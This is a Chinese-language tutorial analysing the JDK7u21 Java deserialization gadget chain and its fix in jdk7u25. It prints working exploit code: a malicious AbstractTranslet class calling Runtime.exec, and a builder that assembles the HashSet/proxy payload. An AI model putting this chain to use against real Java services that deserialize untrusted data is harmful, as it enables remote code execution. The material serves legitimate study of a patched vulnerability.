# TemplatesImpl

在理解JDK7U21前，需要先了解TemplatesImpl，由于调用其getOutputProperties可以加载字节码形式的class而导致任意代码执行的特性，所以许多Gadget都是围绕着如何调用TemplatesImpl.getOutputProperties()方法展开的，比如fastjson反序列化的TemplatesImpl链是如此，本文主要内容JDK7U21也是如此。

我们来看下TemplatesImpl的getOutputProperties：
```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```
他会调用newTransformer，跟进：
```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  // 注意这里的getTransletInstance()，跟进
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```
跟进getTransletInstance：
```java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null; // 这里判断_name的值，因此构造时需要给他赋值

        if (_class == null) defineTransletClasses(); // 跟进

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }

        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```
跟进defineTransletClasses：
```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) { // 如果_bytecodes为null，则会抛出错误，因此需要赋值
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }
    // 实例化一个classloader，此时，loader类型为TransletClassLoader，他是TemplatesImpl内部自己实现的一个子类
    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader());
            }
        });

    try {
        final int classCount = _bytecodes.length; // 获取_bytecodes的长度，_bytecodes是二维数组
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new Hashtable();
        }
        // 遍历_bytecodes
        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]); //调用TransletClassLoader.defineClass进行类加载，并赋值给_class
            final Class superClass = _class[i].getSuperclass();
            // 获取class的父类

            // 判断父类是不是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，如果是，则给_transletIndex赋值，默认为-1
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }
        // 如果_transletIndex为默认值，则抛出错误，这意味着，我们传进来的class至少要有一个class是AbstractTranslet的子类，才能让_transletIndex > 0
        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```
回到TemplatesImpl.getTransletInstance，
```java
if (_class == null) defineTransletClasses(); // 完成_class赋值

AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  // 根据_transletIndex索引位置，对_class中的最后一个AbstractTranslet类进行实例化
```
我们知道，对大部分类进行实例化，都会调用他的构造方法，因此我们只需要构造一个恶意类，在构造方法中写入命令执行之类的代码即可，正如上面代码注释所言，这个恶意类必须继承AbstractTranslet。

了解这些以后，我们就可以尝试构造代码来实现，首先构造恶意代码：
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exploit extends AbstractTranslet {
    public Exploit() throws Exception{
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception{
        Exploit exploit = new Exploit();
    }
}
```
然后javac编译:
```
javac Exploit.java
```

> 需要注意的是，此时的javac必须是与当前环境相同的jdk版本，由于本文讨论的是JDK7U21，所以当前项目环境的SDK为jdk1.7，这在多jdk版本的PC环境下通常会出现问题，比如你的javac命令是jdk1.8或者jdk11的，而项目环境是jdk1.7，则后续调试环节会报错：`java.lang.UnsupportedClassVersionError: Unsupported major.minor version 52.0`（大致是loadClass环节），不过由于这个需求是一次性的，所以直接去jdk1.7的Home目录下找javac即可，MacOS的Path是：
```
/Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/bin/javac
```
> 用这个javac来编译就不会出错

然后构造测试demo：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;

public class templatesImpl{
    public static void main(String[] args) throws Exception{
        TemplatesImpl tmpl = new TemplatesImpl();

        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] bytes = new byte[1][];
        bytes[0] = readClassFileToByteArray("Exploit.class");
        bytecodes.set(tmpl, bytes);

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "Exploit");  // 可以瞎填，不为空即可

        tmpl.getOutputProperties();
    }

    public static byte[] readClassFileToByteArray(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] fileData = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) {
            int bytesRead = fis.read(fileData);
            if (bytesRead != fileData.length) {
                throw new IOException("Failed to read the complete file");
            }
        }
        return fileData;
    }
}
```

代码细节见于：`templatesImpl.java` 和 `Exploit.java`

最后总结一下TemplatesImpl的调用链：
```java
TemplatesImpl.getOutputProperties() -> newTransformer()
    -> getTransletInstance()
        -> defineTransletClasses()
            -> TransletClassLoader.defineClass()
        -> (AbstractTranslet) _class[_transletIndex].newInstance()
```

> 插一句：直接调用newTransformer，效果和调用getOutputProperties是一样的。

接下来的问题就是如何调用TemplatesImpl.getOutputProperties/newTransformer，这就引到了AnnotationInvocationHandler的讨论。

# AnnotationInvocationHandler

在CC1时，我们就已经接触到了AnnotationInvocationhandler，只不过当时关注点在Map.put/get这些方法的调用上，其实他的getMemberMethods方法也很有特点：
```java
private Method[] getMemberMethods() {
    // 主要作用就是获取this.type所有方法，然后返回
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }

    return this.memberMethods;
}
```
getMemberMethods方法会获取this.type的所有方法，并返回。这个方法被equalsImpl调用，我们来看下：

```java
private Boolean equalsImpl(Object var1) {
    if (var1 == this) {  
        return true;
    } else if (!this.type.isInstance(var1)) {  // 必须与this.type同类型
        return false;
    } else {
        Method[] var2 = this.getMemberMethods();  //调用getMemberMethods，获得所有方法
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) { // 遍历所有方法
            Method var5 = var2[var4];  
            String var6 = var5.getName();
            Object var7 = this.memberValues.get(var6);
            Object var8 = null;
            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
            if (var9 != null) {
                var8 = var9.memberValues.get(var6);
            } else {
                try {
                    var8 = var5.invoke(var1);  // 通过反射进行方法调用
                } catch (InvocationTargetException var11) {
                    return false;
                } catch (IllegalAccessException var12) {
                    throw new AssertionError(var12);
                }
            }

            if (!memberValueEquals(var7, var8)) {
                return false;
            }
        }

        return true;
    }
}
```
结合上面代码，我们可以得出结论：
1. this.type与var1必须同类型
2. 只要调用equalsImpl方法，this.type的所有方法都会被调用
3. 如果this.type是Templates呢？不就可以调用getOutputProperties/newTransformer了？

我们可以轻松构造demo验证：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class annotationInvocationHandler {
    public static void main(String[] args) throws Exception{
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object ahObject = constructor.newInstance(Templates.class, new HashMap<String, Object>());

        Method equalsImpl = aClass.getDeclaredMethod("equalsImpl", Object.class);
        equalsImpl.setAccessible(true);
        equalsImpl.invoke(ahObject, new templatesImpl().getTmpl());
    }
}
```

这里我们可以注意到，在实例化AnnotationInvocationHandler时，传进入的是Templates.class：
```java
Object ahObject = constructor.newInstance(Templates.class, new HashMap<String, Object>());
```
而不是TamplatesImpl.class，为什么会这样？

原因在于：equalsImpl会调用所有方法，如果是TemplatesImpl，那么newTransformer/getOutputProperties的索引分别是13和14，压根执行不到这里就会报错退出了。而Templates只有两个方法，分别是newTransformer和getOutputProperties，这两个方法无论执行哪个都能rce。

完整代码见于：`annotationInvocationHander.java`  

# `invoke` -> `equalsImpl`

上面讲到AnnotationInvocationHandler.equalsImpl可以链接TemplatesImpl.getOutputProperties，那么问题来了，谁调用了equalsImpl呢？

当我们打开AnnotationInvocationHandler.invoke方法，就会发现这样一段代码：
```java
public Object invoke(Object var1, Method var2, Object[] var3) { // var1是被代理对象，var2是被调用的方法，var3是方法参数列表
    String var4 = var2.getName();
    Class[] var5 = var2.getParameterTypes();
    if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) { // 当被调用的方法名为equals，且该方法仅接受一个Object类型的参数时，符合if条件，步入
        return this.equalsImpl(var3[0]);  // 这里调用了equalsImpl，var3[0]如果是恶意TemplatesImpl对象，则能够代码执行
    } else {
        ....
    }
}
```
invoke方法在CC1中已经见过，当一个类被AnnotationInvocationHandler代理，那么他的任何方法调用都会先进入invoke方法。那么现在只要找到一个类，他在反序列化时会自动调用equals方法，我们只要对他进行动态代理，那么他执行equals方法时自然会进入AnnotationInvocationHandler.invoke方法，然后再调用equalsImpl，巴拉巴拉。  


# HashSet

HashSet的readObject代码如下：
```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in any hidden serialization magic
    s.defaultReadObject();

    // Read in HashMap capacity and load factor and create backing HashMap
    int capacity = s.readInt();
    float loadFactor = s.readFloat();
    map = (((HashSet)this) instanceof LinkedHashSet ?
            new LinkedHashMap<E,Object>(capacity, loadFactor) :
            new HashMap<E,Object>(capacity, loadFactor));

    // Read in size
    int size = s.readInt();

    // Read in all elements in the proper order.
    for (int i=0; i<size; i++) { // 枚举HashSet每一个数据，一个个反序列化，然后调用map.put，这个map无非是HashMap或LinkedHashMap
        E e = (E) s.readObject();
        map.put(e, PRESENT); // 跟进，PRESENT就是个空的Object对象
    }
}
```
跟进map.put：
```java
public V put(K key, V value) {
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key);  // 计算key的hash
    int i = indexFor(hash, table.length);
    for (Entry<K,V> e = table[i]; e != null; e = e.next) { // 判断当前key的hash是否已经在Set中了，如果是，则步入，并从Set中取出具有相同hash的e
        Object k;
        if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { // 如果e与key的hash完全相同，且e与key相同，则步入，此时调用key的equals方法，值得注意的是，这里传入的参数为k，所以我们的恶意TemplatesImpl对象放在k中
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }

    modCount++;
    addEntry(hash, key, value, i);
    return null;
}
```
由于Set是不可以重复的，因此HashSet在反序列化时，依次对每一个值反序列化，然后放入HashMap，为了保证值不重复，就需要在每次放入HashMap前检查是否已经存过相同的数据了，如何定义两个数据是否相同呢？HastSet通过对数值本身以及其hashcode是否完全相同的二维方式来判断。

上面put方法中的：`if (e.hash == hash && ((k = e.key) == key || key.equals(k)))`就是用来做这个二维判断的。

key应该是Templates类型，这样的话，当他被AnnotationInvocationHandler代理以后，其equals的调用，会自动进入AnnotationInvocationHandler.invoke方法。这一点很好解决。

但考虑到HashSet中必须有至少两个元素的hashcode相同，才会进行这个二维判断，由于我们需要往HashSet中填入数据类似如下：
```java
HashSet hashSet = new HashSet();
hashSet.add(templates);  // 被代理的Templates
hashSet.add(new templatesImpl().getTmpl());  // 恶意TemplatesImpl对象
```
因此本质上，我们需要保证被代理的Templates与恶意TemplatesImpl对象的hashCode值相等。
(提前做个总结：被代理的Templates的hashCode()走的是AnnotationInvocationHandler.hashCodeImpl()，而恶意TemplatesImpl对象的hashCode走的是Object.hashCode，具体原因下面会分析)

HashMap中计算hashCode主要是依靠hash方法，跟进看下：
```java
final int hash(Object k) {
    int h = 0;
    if (useAltHashing) {
        if (k instanceof String) {
            return sun.misc.Hashing.stringHash32((String) k);
        }
        h = hashSeed;
    }

    h ^= k.hashCode();

    // This function ensures that hashCodes that differ only by
    // constant multiples at each bit position have a bounded
    // number of collisions (approximately 8 at default load factor).
    h ^= (h >>> 20) ^ (h >>> 12);
    return h ^ (h >>> 7) ^ (h >>> 4);
}
```
主要是做了亦或和无符号右移这些操作，其核心在于k.hashCode。

经过调试我发现，由于TemplatesImpl没有实现hashCode方法，所以大概率在计算hashCode时，调用的是Object.hashCode方法，由于这个方式是native修饰的，我们看不到实现，且每次计算的结果不一样。比如我先后两次调试，计算出的hashCode分别是：1217519979、768178162。理论上，我们无法预测TemplatesImpl对象的hashCode值，所以只能寄希望于被劫持的Templates。

由于Templates被劫持了，所以现在我们来看AnnotationInvocationHandler的invoke方法：
```java
else if (var4.equals("hashCode")) {
    return this.hashCodeImpl();
```
因此，hashMap计算被劫持的Templates的hashCode时，其实是调用的AnnotationInvocationHandler.hashCodeImpl，跟进：
```java
private int hashCodeImpl() {
    int var1 = 0;

    Map.Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
        var3 = (Map.Entry)var2.next();
    }

    return var1;
}
```
核心就是：
```java
for(
    Iterator var2 = this.memberValues.entrySet().iterator(); 
    var2.hasNext(); 
    var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
    ) {
        var3 = (Map.Entry)var2.next();
    }
```
这是在遍历this.memberValues，先给var2初始化，然后通过hasNext()判断是否有数据，如果有，则步入代码块，通过next对var3进行赋值，然后取key计算hashCode与value的hashCode进行亦或，然后将结果给到var1，接着继续循环，最后return var1，var1就是hashCode。看起来有点复杂。不过我们可以简化。

首先，我们可以设定this.memberValues的长度为1，于是for循环就不存在了，其代码逻辑实际上就变成了：
```java
Map.Entry var3 = (Map.Entry) this.memberValues.entrySet().iterator().next(); 

var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
```

我们来看下memberValuehashCode部分代码：
```java
private static int memberValueHashCode(Object var0) {
    Class var1 = var0.getClass();
    if (!var1.isArray()) {
        return var0.hashCode();
    }...
}
```
所以上面代码还可以简化成：
```java
127 * ((String)var3.getKey()).hashCode() ^ var3.getValue().hashCode();
```

经过测试，笔者发现虽然每次TemplatesImpl对象的hashCode方法执行结果都不同，但在同一次程序运行中，同一个TemplatesImpl对象的hashCode方法多次运行返回结果却是一样的！
因此，如果var3.getValue()与恶意TemplatesImpl为同一个TemplatesImpl对象，那么他们的hashCode也就完全相同，于是计算公式就变成了：
```java
127 * ((String)var3.getKey()).hashCode() ^ 恶意TemplatesImpl.hashCode() = 恶意TemplatesImpl.hashCode()
```
任何数，与0亦或，结果都是他自身，所以如果我们能让：127 * ((String)var3.getKey()).hashCode()为0，就可以完成HashMap的hashCode校验了。

P牛写了个爆破程序：
```java
public static void bruteHashCode() {
    for (long i = 0; i < 9999999999L; i++) {
        if (Long.toHexString(i).hashCode() == 0) {
            System.out.println("Found a value: " + i);
            break; 
        }
    }
}
```
结果为：`f5a5a608`，ysoserial用的就是这个。

# 汇总

根据上面的分析总结，我们可以总结出反序列化的链为：
```java
HashSet.readObject() -> HashMap.put()  // HastSet反序列化，发现hashCode相同，触发比较
    -> Templates.euqals() -> AnnotationInvocationHandler.invoke() -> equalsImpl() // equals被劫持，实际执行equalsImpl
        -> getMemberMethods()  // 获取Templates所有方法
        -> Method.invoke() => TemplatesImpl.getOutputProperties()  // 依次通过反射执行方法
```

按照这种思路，我们可以构造代码，首先创建一个HashSet，一个元素是恶意TemplatesImpl对象，另一个是被劫持的Templates。后者尤其需要注意一点：
> AnnotationInvocationHandler对象构造时，需要定义this.memberValue，我们需要创建一个HashMap给他，里面只有一组KV，即：key=f5a5a608，value=恶意TemplatesImpl对象。

然后序列化即可，怎么样，是不是很简单。

demo大致如下：
```java
// 构造恶意TemplatesImpl对象
TemplatesImpl tmpl = new TemplatesImpl();
Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
bytecodes.setAccessible(true);
byte[][] bytes = new byte[1][];
bytes[0] = readClassFileToByteArray("/Users/jijue/Documents/GitHub/JavaUnserial/JDK7U21/src/main/java/Exploit.class");
bytecodes.set(tmpl, bytes);
Field name = TemplatesImpl.class.getDeclaredField("_name");
name.setAccessible(true);
name.set(tmpl, "Exploit1");

// 构造memberValue
HashMap hashMap = new HashMap();
hashMap.put("f5a5a608",tmpl);

// 创建AnnotationInvocationHandler
Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler aHandler = (InvocationHandler) constructor.newInstance(Templates.class,hashMap); // 设置this.type和this.memberValue
// 代理Templates
Templates templates = (Templates) Proxy.newProxyInstance(Override.class.getClassLoader(), new Class[]{Templates.class}, aHandler);

// 创建HashSet，填入两个元素，两者hashCode保持动态一致
HashSet hashSet = new HashSet();
hashSet.add(templates);
hashSet.add(tmpl);
```

具体代码见于：`GenJDK7U21.java`

# 修复

该链俗名Jdk7u21，因此在jdk1.7中，他可以在jdk7u21及以前使用。

在P牛的《java安全漫谈》中，经他考据，jdk6u45及以前也可以使用该链，后续的版本应该是修复了。而jdk1.8全版本都不能使用该链。

在github上，我们可以看到官方是如何修复漏洞的：https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e#/

我们先不看修复，先回到jdk7u21链中HashSet的readObject方法：
```java
private void readObject(java.io.ObjectInputStream s) throws java.io.IOException,ClassNotFoundException {
    .....

    // Read in all elements in the proper order.
    for (int i=0; i<size; i++) {
        E e = (E) s.readObject(); // 看这里！！
        map.put(e, PRESENT);
    }
}
```
由于我们在构造Gadget时，往HashSet中放了两个元素，分别是恶意TemplatesImpl对象和被代理的Templates，在上面的for循环中会分别对这两个元素进行readObject，由于Templates被代理了，因此势必会调用AnnotationInvocationHandler.readObject方法，我们来看下他是咋写的：

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type); // 看这里！！
    } catch (IllegalArgumentException var9) {
        return;
    }
    ....
}
```
这里会检查this.type是不是Annotation类型，问题是在我们的Gadget中，this.type必须是Templates.class，这样在equalsImpl时才能调用TemplatesImpl.getOutputProperties方法，因此这里必定会报错：IllegalArgumentException，在上面的代码中可以看到，仅return了，并不影响后续代码执行。

现在我们来看官方在jdk7u25中的修复，他选择在AnnotationInvocationHandler.readObject中检查this.type，如果不是Annotation类型，就直接抛出错误：
```java
try {
    annotationType = AnnotationType.getInstance(type);
} catch(IllegalArgumentException e) {
    throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
}
```
HashSet.readObject中并没有捕获这个错误，所以自然就直接中断程序了。

从效果上来看，这确实阻断了jdk7u21，但如果某个类的readObject捕获了了错误并且什么都没做呢？这就引出了Jdk8u20，我们后续会展开讨论。

----

参考文献：
* 《Java安全漫谈》